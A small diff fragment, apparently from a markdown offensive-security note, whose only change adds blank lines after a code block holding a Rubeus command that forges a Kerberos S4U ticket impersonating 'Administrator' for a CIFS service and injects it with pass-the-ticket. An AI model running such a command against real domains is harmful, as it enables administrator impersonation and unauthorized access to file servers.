@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:07.954586+00:00'
 ```bash
 Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
 ```
+
+
